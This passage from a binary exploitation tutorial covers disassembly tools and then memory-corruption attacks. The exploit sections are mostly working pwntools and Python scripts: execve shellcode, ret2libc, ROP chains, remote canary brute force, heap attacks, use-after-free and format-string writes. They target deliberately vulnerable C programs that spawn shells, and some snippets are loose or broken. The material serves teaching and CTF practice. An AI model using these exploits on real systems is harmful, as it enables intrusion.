
```asm
mov esp, ebp
pop ebp
ret
# or simply: leave; ret
```

**Analyzing Function Calls with Static Tools**

**objdump**

```bash
# Disassemble entire binary
objdump -d ./binary

# Disassemble specific section
objdump -d -j .text ./binary

# Show all symbols
objdump -t ./binary

# Show dynamic relocations
objdump -R ./binary
```

**radare2 Function Analysis**

```bash
# Open binary
r2 ./binary

# Analyze all functions
aaa

# List functions
afl

# Analyze specific function
af @ function_name

# Disassemble function
pdf @ function_name
pdf @ main

# Show function calls
axt @ sym.function_name  # Cross-references to
axf @ sym.function_name  # Cross-references from

# Call graph
agc                      # Call graph for current function
agC                      # Global call graph

# Function signature
afv @ function_name      # Variables
afi @ function_name      # Function info
```

**Ghidra Function Analysis**

```bash
# Load binary in Ghidra
# Analysis -> Auto Analyze

# View function listing: Window -> Functions
# View imports: Window -> Symbol Tree -> Imports
# View exports: Window -> Symbol Tree -> Exports

# Decompilation: Select function, press F5
# Call graph: Graph -> Calls (from/to)
```

**Import Analysis**

**PLT and GOT (Linux)**

PLT (Procedure Linkage Table) and GOT (Global Offset Table) implement lazy binding:

```bash
# View PLT
objdump -d -j .plt ./binary

# View GOT
objdump -s -j .got.plt ./binary

# In radare2
ii                   # List imports
is~imp               # Show import symbols

# In GDB
info functions       # All functions
info variables       # All variables
```

**IAT (Import Address Table - Windows)**

```bash
# Using pefile (Python)
python3 -c "import pefile; pe=pefile.PE('binary.exe'); print([e.dll.decode() for e in pe.DIRECTORY_ENTRY_IMPORT])"

# Detailed import listing
python3 << EOF
import pefile
pe = pefile.PE('binary.exe')
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    print(f"\n{entry.dll.decode()}:")
    for imp in entry.imports:
        print(f"  {imp.name.decode() if imp.name else 'N/A'}")
EOF
```

**Identifying Dangerous Functions**

```bash
# Search for dangerous functions in radare2
r2 ./binary
aaa
afl~strcpy
afl~gets
afl~sprintf

# Using grep with objdump
objdump -d ./binary | grep -E "(strcpy|gets|sprintf|scanf)@plt"

# All imports with rabin2
rabin2 -i ./binary
```

**Common Dangerous Functions**:

- `gets()` - No bounds checking
- `strcpy()` - No bounds checking
- `sprintf()` - Format string vulnerability
- `scanf()` - Potential overflow
- `strcat()` - No bounds checking
- `system()` - Command injection

**Function Hooking Detection**

```bash
# In GDB, check for hooks
x/5i function_name
# Look for: jmp instructions to unexpected addresses

# Compare with file on disk
disassemble function_name
!objdump -d binary | grep -A 10 "<function_name>"
```

**Dynamic Function Call Analysis**

**ltrace**

```bash
# Trace library calls
ltrace ./binary

# Specific functions
ltrace -e malloc+free ./binary

# With arguments
ltrace -C ./binary
```

**strace**

```bash
# Trace system calls
strace ./binary

# Follow forks
strace -f ./binary

# Filter specific syscalls
strace -e trace=open,read,write ./binary
```

**Frida for Runtime Hooking**

[Inference] Frida allows JavaScript-based instrumentation of running processes:

```javascript
// Hook a function
Interceptor.attach(Module.findExportByName(null, "strcmp"), {
    onEnter: function(args) {
        console.log("strcmp called");
        console.log("arg1:", Memory.readUtf8String(args[0]));
        console.log("arg2:", Memory.readUtf8String(args[1]));
    },
    onLeave: function(retval) {
        console.log("Return value:", retval);
    }
});
```

**Identifying Indirect Calls**

```bash
# In radare2
pdf @ function_name
# Look for: call rax, call qword [rbp-0x8]

# In GDB with context
disassemble function_name
# Set breakpoint on indirect call
break *0x<address>
# When hit, examine register
info registers rax
x/i $rax
```

**Virtual Function Tables (C++)**

```bash
# In Ghidra/IDA, look for:
# - Constructor initializing vtable pointer
# - Calls through pointer at offset 0 of object

# In GDB
# Print object
print *(Object*)0x<address>
# Examine vtable
x/10gx <vtable_address>
# Each entry is a function pointer
x/i <function_pointer>
```

**Reconstructing Function Arguments**

```bash
# x86_64 example (System V)
break function_name
run
# Check argument registers
info registers rdi rsi rdx rcx r8 r9

# For stack arguments
x/10gx $rsp+8  # Skip return address

# Automatic with pwndbg
context
# Shows registers and stack clearly
```

---

## Memory Corruption Exploitation

### Buffer Overflow Detection

Buffer overflow vulnerabilities occur when data written to a buffer exceeds its allocated size, overwriting adjacent memory.

**Static Analysis Detection**

```bash
# Using Ghidra for static analysis
# Look for dangerous functions:
# - strcpy, strcat, sprintf, gets, scanf
# - memcpy with unchecked length
# - Fixed-size buffers with user input

# Using IDA Pro
# Search for vulnerable patterns
# Alt+T -> "strcpy" or other dangerous functions

# Using radare2
r2 binary
aaa  # Analyze all
afl  # List functions
pdf @ main  # Disassemble main
/ strcpy  # Search for strcpy calls
```

**Dynamic Analysis with Fuzzing**

```bash
# Basic AFL++ fuzzing setup
# Install AFL++
git clone https://github.com/AFLplusplus/AFLplusplus
cd AFLplusplus
make
sudo make install

# Compile target with instrumentation
afl-gcc -o target target.c
# Or for C++
afl-g++ -o target target.cpp

# Create input directory with seed files
mkdir input
echo "test" > input/seed1

# Start fuzzing
afl-fuzz -i input -o output -- ./target @@

# Monitor crashes in output/crashes/
```

**Pattern Generation for Offset Detection**

```bash
# Using Metasploit pattern_create
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000

# Using pwntools
python3 -c "from pwn import *; print(cyclic(1000))"

# Using GDB with GEF/PEDA
gef> pattern create 1000
gef> pattern search $rsp  # After crash
```

**GDB-Based Detection**

```bash
# Start GDB with GEF or PEDA
gdb ./vulnerable_binary

# Set up debugging
gef> run $(python3 -c "print('A'*500)")

# Check for segmentation fault
# Examine registers
gef> info registers

# Check instruction pointer overwrite
gef> x/wx $rip  # x86_64
gef> x/wx $eip  # x86

# Find offset
gef> pattern search $rsp
```

**Valgrind for Memory Error Detection**

```bash
# Run with Valgrind
valgrind --leak-check=full --track-origins=yes ./binary input

# Look for:
# - Invalid write of size X
# - Invalid read of size X
# - Use of uninitialized value
```

**AddressSanitizer (ASAN)**

```bash
# Compile with ASAN
gcc -fsanitize=address -g -o binary source.c

# Run binary
./binary input

# ASAN will report:
# - Heap buffer overflow
# - Stack buffer overflow
# - Use-after-free
# - Double-free
```

**Detecting Protection Mechanisms**

```bash
# Check binary protections using checksec
checksec --file=binary

# Output shows:
# RELRO: Full/Partial/No
# Stack: Canary found/No canary found
# NX: NX enabled/NX disabled
# PIE: PIE enabled/No PIE
# FORTIFY: Enabled/Disabled

# Using rabin2 (radare2)
rabin2 -I binary

# Using readelf
readelf -l binary | grep GNU_STACK
readelf -d binary | grep BIND_NOW  # RELRO check
```

### Stack-Based Overflow Exploitation

Stack overflows overwrite return addresses to redirect execution flow.

**Basic Stack Layout**

```
High Memory
+------------------+
| Command line args|
+------------------+
| Environment vars |
+------------------+
| Stack (grows ↓)  |
|   Return address |
|   Saved EBP/RBP  |
|   Local variables|
+------------------+
| Heap (grows ↑)   |
+------------------+
Low Memory
```

**Simple Stack Overflow Example**

Vulnerable code:

```c
// vulnerable.c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking
    printf("Buffer contents: %s\n", buffer);
}

int main(int argc, char **argv) {
    if(argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable_function(argv[1]);
    return 0;
}
```

Compile without protections:

```bash
# Disable protections for learning
gcc -o vulnerable vulnerable.c -fno-stack-protector -z execstack -no-pie -m32

# Explanation:
# -fno-stack-protector: Disable stack canaries
# -z execstack: Make stack executable
# -no-pie: Disable ASLR
# -m32: 32-bit binary (simpler for learning)
```

**Finding Offset to Return Address**

```bash
# Generate pattern
pattern_create.rb -l 200

# Run in GDB
gdb ./vulnerable
run Aa0Aa1Aa2Aa3...

# Find offset
pattern_offset.rb -q 0x41614141  # Value in EIP/RIP
# Output: [*] Exact match at offset 76
```

**Basic Return Address Overwrite**

```python
#!/usr/bin/env python3
from struct import pack

# Offset to return address
offset = 76

# Target address to jump to (e.g., another function)
target_address = 0x08048456  # Address of win() function

# Build payload
payload = b"A" * offset
payload += pack("<I", target_address)  # Little-endian 32-bit

# Write to file or use directly
with open("payload", "wb") as f:
    f.write(payload)
```

Execute:

```bash
./vulnerable $(cat payload)
```

**Shellcode Injection**

```python
#!/usr/bin/env python3
from struct import pack

# 32-bit Linux execve("/bin/sh") shellcode
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
)

# Find buffer address using GDB
# gdb> break vulnerable_function
# gdb> run AAAA
# gdb> x/100x $esp
buffer_address = 0xbffff5c0  # Example address

offset = 76
nop_sled = b"\x90" * (offset - len(shellcode))

payload = nop_sled + shellcode
payload += pack("<I", buffer_address)

print(payload)
```

**Return-to-libc (NX Bypass)**

When NX is enabled, execute existing code:

```python
#!/usr/bin/env python3
from struct import pack

# Find function addresses
# gdb> print system
# gdb> print exit
# gdb> find &system,+9999999,"/bin/sh"

system_addr = 0xb7e42da0
exit_addr = 0xb7e35870
binsh_addr = 0xb7f74a24

offset = 76

payload = b"A" * offset
payload += pack("<I", system_addr)  # Call system()
payload += pack("<I", exit_addr)    # Return address for system()
payload += pack("<I", binsh_addr)   # Argument: "/bin/sh"

with open("payload", "wb") as f:
    f.write(payload)
```

**ROP Chain Construction (64-bit)**

```python
#!/usr/bin/env python3
from pwn import *

binary = ELF('./vulnerable_64')
rop = ROP(binary)

# Find gadgets
# ROPgadget --binary vulnerable_64

offset = 88  # 64-bit typically longer offset

# Build ROP chain
rop.raw(b'A' * offset)
rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])  # Pop argument into RDI
rop.raw(next(binary.search(b'/bin/sh')))          # Address of "/bin/sh"
rop.raw(binary.plt['system'])                      # Call system()

payload = rop.chain()
print(payload)
```

**Bypassing Stack Canaries**

[Inference] Stack canaries can sometimes be bypassed through information disclosure or brute force on forking servers:

```python
#!/usr/bin/env python3
from pwn import *

# Brute force canary byte-by-byte (forking server)
def leak_canary():
    canary = b"\x00"  # Canary always starts with null byte
    
    for i in range(1, 8):  # 7 bytes to leak (x64)
        for byte in range(256):
            io = remote('target', 1337)
            payload = b"A" * 72 + canary + bytes([byte])
            io.send(payload)
            response = io.recvall(timeout=1)
            
            if b"stack smashing detected" not in response:
                canary += bytes([byte])
                log.info(f"Canary byte {i}: {hex(byte)}")
                break
            io.close()
    
    return canary

canary = leak_canary()
log.success(f"Full canary: {canary.hex()}")
```

### Heap-Based Overflow Exploitation

Heap overflows corrupt heap metadata or adjacent objects to achieve code execution.

**Heap Structure (glibc malloc)**

```
Chunk in use:
+------------------+
| prev_size        | (if previous chunk is free)
+------------------+
| size | flags     | (size includes metadata)
+------------------+
| user data        |
|                  |
+------------------+

Free chunk:
+------------------+
| prev_size        |
+------------------+
| size | flags     |
+------------------+
| fd (forward ptr) |
+------------------+
| bk (back ptr)    |
+------------------+
| user data        |
+------------------+
```

**Heap Overflow Example**

Vulnerable code:

```c
// heap_overflow.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    char buffer[64];
    void (*function_ptr)(void);
} data_struct;

void normal_function() {
    printf("Normal function called\n");
}

void win() {
    printf("You win! Executing shell...\n");
    system("/bin/sh");
}

int main(int argc, char **argv) {
    data_struct *data1 = malloc(sizeof(data_struct));
    data_struct *data2 = malloc(sizeof(data_struct));
    
    data2->function_ptr = normal_function;
    
    if(argc > 1) {
        strcpy(data1->buffer, argv[1]);  // Heap overflow
    }
    
    data2->function_ptr();  // Call overwritten function pointer
    
    free(data1);
    free(data2);
    return 0;
}
```

Compile:

```bash
gcc -o heap_overflow heap_overflow.c -no-pie
```

**Basic Heap Overflow Exploit**

```python
#!/usr/bin/env python3
from struct import pack

# Find win() function address
# objdump -d heap_overflow | grep win
win_addr = 0x0804869d  # Example address

# Overflow first chunk into second chunk's function pointer
payload = b"A" * 64      # Fill buffer
payload += b"B" * 16     # Overflow into metadata (size fields)
payload += pack("<I", win_addr)  # Overwrite function_ptr

print(payload)
```

**Fastbin Dup (Double Free)**

```c
// fastbin_dup.c
#include <stdio.h>
#include <stdlib.h>

int main() {
    void *chunk1 = malloc(0x40);
    void *chunk2 = malloc(0x40);
    
    free(chunk1);
    free(chunk2);
    free(chunk1);  // Double free - creates cycle in fastbin
    
    void *alloc1 = malloc(0x40);  // Gets chunk1
    void *alloc2 = malloc(0x40);  // Gets chunk2
    void *alloc3 = malloc(0x40);  // Gets chunk1 again!
    
    // Now alloc1 and alloc3 point to same memory
    printf("alloc1: %p\nalloc3: %p\n", alloc1, alloc3);
    
    return 0;
}
```

**Fastbin Attack Exploit**

```python
#!/usr/bin/env python3
from pwn import *

binary = ELF('./fastbin_vuln')
libc = ELF('./libc.so.6')

io = process(binary.path)

# Step 1: Create fastbin dup
# Assuming functions: alloc(), free(), edit()
alloc(0)  # chunk 0
alloc(1)  # chunk 1

free(0)
free(1)
free(0)  # Double free - fastbin: 0 -> 1 -> 0

# Step 2: Allocate and overwrite fd pointer
alloc(2)  # Gets chunk 0
target_address = binary.symbols['__malloc_hook'] - 0x23  # Fake chunk
edit(2, p64(target_address))  # Overwrite fd

# Step 3: Allocate to get fake chunk in list
alloc(3)  # Gets chunk 1
alloc(4)  # Gets chunk 0 again
alloc(5)  # Gets fake chunk at target_address

# Step 4: Write one_gadget to __malloc_hook
one_gadget = libc.address + 0x4f3c2  # Example offset
edit(5, p64(one_gadget))

# Next malloc() will execute one_gadget
alloc(6)  # Triggers shell

io.interactive()
```

**Tcache Poisoning (glibc >= 2.26)**

```python
#!/usr/bin/env python3
from pwn import *

# Tcache has less security checks than fastbins
io = process('./tcache_vuln')

# Create tcache dup
alloc(0, 0x80)
alloc(1, 0x80)

free(0)
free(0)  # Double free into tcache

# Poison tcache with target address
alloc(2, 0x80)  # Gets chunk 0
target = 0x601060  # GOT entry or other target
edit(2, p64(target))  # Overwrite tcache->next

# Allocate twice to get arbitrary write
alloc(3, 0x80)
alloc(4, 0x80)  # Returns target address

# Overwrite target
edit(4, p64(0xdeadbeef))

io.interactive()
```

**House of Force**

Exploits wilderness chunk (top chunk) size field:

```python
#!/usr/bin/env python3
from pwn import *

io = process('./house_of_force')

# Step 1: Overflow to overwrite top chunk size
alloc(0, 0x18)
payload = b"A" * 0x18
payload += p64(0xffffffffffffffff)  # Overwrite top chunk size
edit(0, payload)

# Step 2: Calculate evil offset
target_address = 0x601060  # Target (e.g., GOT)
current_top = 0x603000     # Current top chunk address
evil_size = target_address - current_top - 0x20

# Step 3: Allocate huge chunk to move top
alloc(1, evil_size)

# Step 4: Allocate at target
alloc(2, 0x18)  # This chunk is at target_address
edit(2, p64(0xdeadbeef))  # Arbitrary write

io.interactive()
```

### Use-After-Free Exploitation

Use-after-free occurs when a program continues using a pointer after the memory has been freed.

**UAF Vulnerable Example**

```c
// uaf_vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    char name[32];
    void (*greet)(void);
} User;

void normal_greet() {
    printf("Hello, normal user!\n");
}

void admin_greet() {
    printf("Hello, admin!\n");
    system("/bin/sh");
}

User *user = NULL;

void create_user() {
    user = malloc(sizeof(User));
    user->greet = normal_greet;
    printf("User created at %p\n", user);
}

void delete_user() {
    free(user);
    // Bug: user pointer not set to NULL
    printf("User freed\n");
}

void set_name() {
    char input[64];
    printf("Enter name: ");
    scanf("%63s", input);
    strcpy(user->name, input);  // UAF: user already freed
}

void greet_user() {
    if(user) {
        user->greet();  // UAF: calling freed object's function
    }
}

int main() {
    int choice;
    while(1) {
        printf("\n1. Create user\n2. Delete user\n3. Set name\n4. Greet\n5. Exit\nChoice: ");
        scanf("%d", &choice);
        
        switch(choice) {
            case 1: create_user(); break;
            case 2: delete_user(); break;
            case 3: set_name(); break;
            case 4: greet_user(); break;
            case 5: return 0;
        }
    }
}
```

Compile:

```bash
gcc -o uaf_vuln uaf_vuln.c -no-pie
```

**UAF Exploitation**

```python
#!/usr/bin/env python3
from pwn import *
from struct import pack

binary = ELF('./uaf_vuln')
io = process(binary.path)

# Find admin_greet address
admin_greet = binary.symbols['admin_greet']
log.info(f"admin_greet @ {hex(admin_greet)}")

# Step 1: Create user (allocates memory)
io.sendlineafter(b'Choice: ', b'1')

# Step 2: Delete user (frees memory but pointer remains)
io.sendlineafter(b'Choice: ', b'2')

# Step 3: Allocate same-sized memory with controlled data
# When we set name, it allocates into the freed chunk
io.sendlineafter(b'Choice: ', b'3')

# Craft payload to overwrite function pointer
payload = b"A" * 32  # Fill name field
payload += pack("<Q", admin_greet)  # Overwrite greet function pointer
io.sendlineafter(b'Enter name: ', payload)

# Step 4: Trigger UAF by calling greet
io.sendlineafter(b'Choice: ', b'4')

io.interactive()
```

**Heap Spray for UAF**

[Inference] When exact allocation order is unpredictable, spray heap with controlled data:

```python
#!/usr/bin/env python3
from pwn import *

io = process('./uaf_vuln')

# Step 1: Create and free target object
io.sendlineafter(b'Choice: ', b'1')
io.sendlineafter(b'Choice: ', b'2')

# Step 2: Spray heap with many allocations
target_value = p64(0xdeadbeef)
for i in range(100):
    # Allocate objects with controlled data
    alloc_spray(target_value * 10)

# Step 3: Trigger UAF
# Likely one spray allocation occupies freed memory
trigger_uaf()

io.interactive()
```

**Type Confusion UAF**

```c
// type_confusion.c
#include <stdio.h>
#include <stdlib.h>

typedef struct {
    int type;
    void (*handler)(void*);
    char data[32];
} Object;

void string_handler(void *obj) {
    Object *o = (Object*)obj;
    printf("String: %s\n", o->data);
}

void admin_handler(void *obj) {
    printf("Admin access granted!\n");
    system("/bin/sh");
}

Object *obj = NULL;

void create(int type) {
    obj = malloc(sizeof(Object));
    obj->type = type;
    obj->handler = string_handler;
}

void delete() {
    free(obj);
}

void set_data() {
    scanf("%32s", obj->data);  // UAF
}

void process() {
    if(obj) obj->handler(obj);  // UAF
}
```

Exploit:

```python
#!/usr/bin/env python3
from pwn import *

io = process('./type_confusion')

# Create and free object
create(1)
delete()

# Reallocate with controlled data
set_data(p64(0) + p64(admin_handler_addr) + b"junk")

# Trigger UAF with type confusion
process()  # Calls admin_handler instead of string_handler

io.interactive()
```

---

### Double-Free Exploitation

Double-free vulnerabilities occur when a program attempts to free the same memory location twice. This causes heap metadata corruption, potentially enabling arbitrary code execution or denial of service.

#### Understanding Heap Metadata

Modern heap allocators maintain metadata structures to track allocated and freed memory chunks. When memory is freed, the allocator marks the chunk as available and links it into a free list. Freeing the same chunk twice corrupts the free list structure, causing subsequent allocations to return overlapping or invalid memory regions.

Heap layout example (simplified):

```
Before first free():
[Allocated Chunk A] [Allocated Chunk B] [Allocated Chunk C]

After first free(A):
[Free Chunk A] ---> [Free List]
[Allocated Chunk B] [Allocated Chunk C]

After second free(A) - DOUBLE FREE:
[Free Chunk A] ---> [Free List] (CORRUPTED)
[Allocated Chunk B] [Allocated Chunk C]
```

#### Vulnerable Code Pattern

```c
#include <stdlib.h>
#include <string.h>

void process_buffer(char *input, size_t len) {
    char *buffer = malloc(len);
    
    if (input[0] == 'X') {
        free(buffer);
        return;  // Early exit without setting buffer to NULL
    }
    
    strcpy(buffer, input);
    free(buffer);  // Second free if input[0] == 'X'
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        process_buffer(argv[1], strlen(argv[1]));
    }
    return 0;
}
```

Trigger the vulnerability:

```bash
./vulnerable_program "Xmalicious_input"
```

When input begins with 'X', the buffer is freed in the conditional block. However, the function continues execution (if not exiting via early return in actual code) and attempts to free the same buffer again.

#### Heap Exploitation Techniques

Fastbin attack (glibc malloc): The fastbin is a singly-linked list of small freed chunks. Double-freeing a chunk in the fastbin allows an attacker to insert arbitrary pointers into the fastbin chain.

```c
#include <stdlib.h>

int main() {
    // Allocate three small chunks
    char *chunk1 = malloc(0x20);
    char *chunk2 = malloc(0x20);
    char *chunk3 = malloc(0x20);
    
    // Free chunks in sequence
    free(chunk1);
    free(chunk2);
    free(chunk1);  // DOUBLE FREE: chunk1 back in fastbin
    
    // Next allocation returns chunk1
    char *fake_chunk = malloc(0x20);
    
    // Write arbitrary data to fake_chunk, which corrupts fastbin pointers
    // Subsequent allocations return attacker-controlled memory regions
    
    return 0;
}
```

Compile and test for heap corruption:

```bash
gcc -g -fno-stack-protector -z execstack -o test test.c
./test
```

The `-fno-stack-protector` flag disables stack canaries (unrelated to heap exploitation but useful for CTF scenarios). The `-z execstack` enables executable stack (modern systems restrict this).

#### Use-After-Free via Double-Free

After a double-free, the attacker controls which memory region is returned by subsequent allocations. If a freed structure contains function pointers or virtual table pointers, the attacker can hijack control flow.

```cpp
#include <stdlib.h>
#include <cstring>

struct Object {
    void (*callback)(void);
    char data[32];
};

void legitimate_callback() {
    printf("Legitimate callback\n");
}

void exploit_callback() {
    printf("Arbitrary code execution!\n");
    system("/bin/sh");
}

int main() {
    Object *obj1 = (Object *)malloc(sizeof(Object));
    obj1->callback = legitimate_callback;
    strcpy(obj1->data, "data1");
    
    Object *obj2 = (Object *)malloc(sizeof(Object));
    obj2->callback = legitimate_callback;
    strcpy(obj2->data, "data2");
    
    free(obj1);
    free(obj2);
    free(obj1);  // Double free
    
    // Allocate memory that overlaps with obj1
    char *fake_data = (char *)malloc(sizeof(Object));
    
    // Write malicious callback pointer
    Object *fake_obj = (Object *)fake_data;
    fake_obj->callback = exploit_callback;
    
    // Next allocation reuses freed obj1
    Object *obj3 = (Object *)malloc(sizeof(Object));
    obj3->callback();  // Calls exploit_callback
    
    return 0;
}
```

#### Protection Mechanisms and Bypass

Modern allocators implement protections against double-free:

1. **Poison value checking**: Freed chunks contain a poison value; double-free detection verifies the poison value is not present in the fastbin.
    
2. **Per-thread fastbin**: Some implementations use thread-local fastbins, limiting double-free exploitation to single-threaded contexts.
    
3. **Randomized heap layout**: ASLR randomizes heap base addresses, making exploitation less reliable but not preventing it entirely.
    

Bypass techniques:

Allocate and free intermediate chunks between the two frees to avoid fastbin detection:

```c
void *chunk1 = malloc(0x20);
void *temp = malloc(0x100);    // Different size to avoid fastbin chain
free(chunk1);
free(temp);
free(chunk1);  // Double-free in different fastbin
```

[Inference] This technique exploits the separation of different-sized chunks into different fastbins, allowing double-free to bypass immediate detection.

#### Exploit Development Tools

Use GDB to inspect heap metadata during exploitation:

```gdb
(gdb) break main
(gdb) run
(gdb) info heap
(gdb) heap chunks          # Shows all heap chunks
(gdb) heap arenas          # Shows arena structures
(gdb) x/xg 0x602000       # Examine memory at address
```

The Glibc heap analysis scripts provide detailed heap state inspection:

```bash
# Install peda for heap analysis
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

# Use peda heap commands
(gdb) heapinfo
(gdb) heapchunks
```

### Integer Overflow Exploitation

Integer overflow occurs when an arithmetic operation produces a result outside the representable range of the integer type. This causes the value to wrap around, potentially leading to buffer overflows, incorrect comparisons, or logic bypasses.

#### Integer Overflow Mechanics

Signed integer overflow behavior (32-bit example):

```c
int max_int = 0x7FFFFFFF;      // 2147483647
int overflow = max_int + 1;    // Result: 0x80000000 (-2147483648)
```

Unsigned integer overflow behavior:

```c
unsigned int max_uint = 0xFFFFFFFF;
unsigned int overflow = max_uint + 1;  // Result: 0 (wraps around)
```

#### Vulnerable Code Pattern: Buffer Overflow via Integer Overflow

```c
#include <stdlib.h>
#include <string.h>

void copy_data(char *source, size_t len) {
    // Allocate buffer with size based on length parameter
    size_t buffer_size = len + 10;  // Add 10 bytes for overhead
    char *buffer = malloc(buffer_size);
    
    if (!buffer) return;
    
    // If len is maximum unsigned value, buffer_size wraps to small value
    memcpy(buffer, source, len);  // Writes beyond allocated buffer
    
    process_buffer(buffer);
    free(buffer);
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        size_t input_len = strlen(argv[1]);
        copy_data(argv[1], input_len);
    }
    return 0;
}
```

Trigger the vulnerability:

```bash
# Create input with length that causes integer overflow
./vulnerable_program "AAAAAAAAAA"
```

If input length is large (e.g., 0xFFFFFFF0), adding 10 causes wrap-around to small value like 0 or a negative number (interpreted as huge unsigned value).

#### Integer Truncation Exploitation

Integer truncation occurs when a larger integer is assigned to a smaller type, losing high-order bits:

```c
#include <stdlib.h>
#include <string.h>

void process_size(long input_size) {
    // Truncation: large long truncated to int
    int buffer_size = input_size;
    char *buffer = malloc(buffer_size);
    
    if (!buffer) return;
    
    // Input size remains the original large value
    memcpy(buffer, user_input, input_size);  // Overflow!
    
    free(buffer);
}

int main() {
    long large_size = 0x100000010;  // 4GB + 16 bytes
    int truncated = (int)large_size;  // Results in 16
    
    char *buffer = malloc(truncated);
    memcpy(buffer, huge_source, large_size);  // 4GB write to 16-byte buffer
    
    return 0;
}
```

#### Sign Extension Vulnerabilities

Sign extension occurs when a signed type is promoted to a larger signed type, preserving the sign bit:

```c
#include <stdlib.h>
#include <string.h>

void read_length_from_network(char *packet) {
    signed char length = packet[0];  // Read as signed byte
    
    // Length -1 (0xFF) sign-extends to -1 in int
    // Check passes if comparing: if (length > 0)
    if (length > 0) {
        // But when used as size_t (unsigned), -1 becomes maximum unsigned value
        char *buffer = malloc(100);
        memcpy(buffer, packet + 1, (size_t)length);  // Copies huge amount of data
        free(buffer);
    }
}

int main() {
    char packet[256];
    packet[0] = 0xFF;  // -1 as signed char
    strcpy(packet + 1, "AAAAAAAAAA...");
    
    read_length_from_network(packet);
    return 0;
}
```

#### Arithmetic Integer Overflow Exploitation

Multiplication overflow in size calculation:

```c
#include <stdlib.h>

void allocate_array(unsigned int count, unsigned int element_size) {
    // Multiplication overflow: count * element_size
    unsigned int total_size = count * element_size;
    
    void *array = malloc(total_size);
    
    // If total_size wrapped due to overflow, allocated size is smaller than expected
    // Subsequent writes overflow the buffer
    for (unsigned int i = 0; i < count; i++) {
        array[i * element_size] = 0x41;  // Write beyond allocated memory
    }
    
    free(array);
}

int main() {
    // 0x100000000 * 2 = 0x200000000 (wraps to 0 on 32-bit system)
    allocate_array(0x100000000, 2);
    return 0;
}
```

#### Detection and Prevention

Detect potential overflows using compiler flags:

```bash
gcc -ftrapv source.c  # Trap on signed overflow (aborts program)
clang -fsanitize=signed-integer-overflow source.c  # Runtime sanitizer
```

Use safe arithmetic libraries that check for overflow:

```c
#include <stdint.h>
#include <limits.h>

// Safe multiplication with overflow check
int safe_multiply(int a, int b, int *result) {
    if (a == 0 || b == 0) {
        *result = 0;
        return 0;
    }
    
    if (a > INT_MAX / b) {
        // Overflow detected
        return -1;
    }
    
    *result = a * b;
    return 0;
}
```

Manual overflow checks before operations:

```c
if (len > SIZE_MAX - 10) {
    // Would overflow
    return error;
}
size_t buffer_size = len + 10;  // Safe
```

### Format String Vulnerabilities

Format string vulnerabilities occur when user-controlled input is used directly as a format string in functions like `printf()`, `sprintf()`, `fprintf()`, or their wide-character equivalents. The attacker supplies format specifiers to read from or write to arbitrary memory locations.

#### Format String Basics

Format specifiers in printf:

```c
printf("%x");       // Read 4-byte value from stack (32-bit)
printf("%s");       // Read string pointer from stack and dereference
printf("%n");       // Write 4 bytes to memory address on stack
printf("%hhn");     // Write 1 byte to memory address on stack
printf("%lln");     // Write 8 bytes to memory address on stack
```

#### Vulnerable Code Pattern

```c
#include <stdio.h>
#include <string.h>

void print_user_message(char *user_input) {
    // VULNERABLE: user_input used directly as format string
    printf(user_input);
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        print_user_message(argv[1]);
    }
    return 0;
}
```

Trigger vulnerability:

```bash
./vulnerable_program "%x.%x.%x.%x"
# Output: 7fff1234.deadbeef.cafebabe.12345678
```

Each `%x` reads and displays a 4-byte value from the stack.

#### Reading Memory via Format String

Read stack values:

```bash
./vulnerable_program "%08x.%08x.%08x.%08x"
```

Read from arbitrary memory address (if address is on stack):

```bash
./vulnerable_program "ADDRESS%x%x%x%s"
# Where ADDRESS is 4-byte value pushed to stack
```

Read specific stack depth:

```bash
./vulnerable_program "%6\$x"  # Sixth stack argument
./vulnerable_program "%8\$s"  # Dereference eighth stack argument as string
```

#### Writing Memory via Format String

The `%n` specifier writes the number of bytes printed to the address specified on the stack:

```bash
./vulnerable_program "AAAA%x%x%x%n"
# Writes number of bytes printed to address 0x41414141
```

Direct parameter access (`$` syntax) allows specifying exact stack positions:

```bash
./vulnerable_program "%134513737x%6\$n"
# Writes 134513737 to the 6th stack parameter
```

One-byte write using `%hhn`:

```bash
./vulnerable_program "AAAA%6\$hhn"
# Writes 1 byte (0x04) to 0x41414141
```

Eight-byte write using `%lln` (64-bit systems):

```bash
./vulnerable_program "AAAAAAAA%6\$lln"
# Writes 8 bytes to 0x4141414141414141
```

#### Exploiting Format String for Code Execution

Target function pointers, return addresses, or Global Offset Table (GOT) entries:

Write to function pointer in memory:

```c
#include <stdio.h>

void (*callback)(void) = NULL;

void vulnerable(char *input) {
    printf(input);
}

void target_function() {
    printf("Code execution achieved!\n");
    system("/bin/sh");
}

int main() {
    char input[1024];
    // Calculate offset of callback function pointer
    // Assume callback is at 0x600d40
    sprintf(input, "\x40\x0d\x60\x00%134513737x%%6$n");
    vulnerable(input);
    return 0;
}
```

Write to GOT entry (Procedure Linking Table hook):

```bash
# Find GOT entry for printf using objdump
objdump -R vulnerable | grep printf

# Generate input that writes to GOT entry
./vulnerable_program "ADDRESS%%134513737x%%6\$n"
```

#### Multi-Stage Format String Exploitation

When writing large values, use multiple writes or value decomposition:

Two-byte writes (short):

```bash
./vulnerable_program "AAAABBBB%134513737x%6\$hn%134513738x%7\$hn"
# Writes high 2 bytes to 0x41414141, low 2 bytes to 0x42424242
```

Build large values incrementally:

```python
target_addr = 0x600d40
target_value = 0x12345678

# First write lower 2 bytes
low_bytes = target_value & 0xFFFF
high_bytes = (target_value >> 16) & 0xFFFF

payload = struct.pack('<I', target_addr)
payload += struct.pack('<I', target_addr + 2)
payload += f"%{low_bytes}x%6$hn%{high_bytes - low_bytes}x%7$hn"
```

#### Format String Bypass Techniques

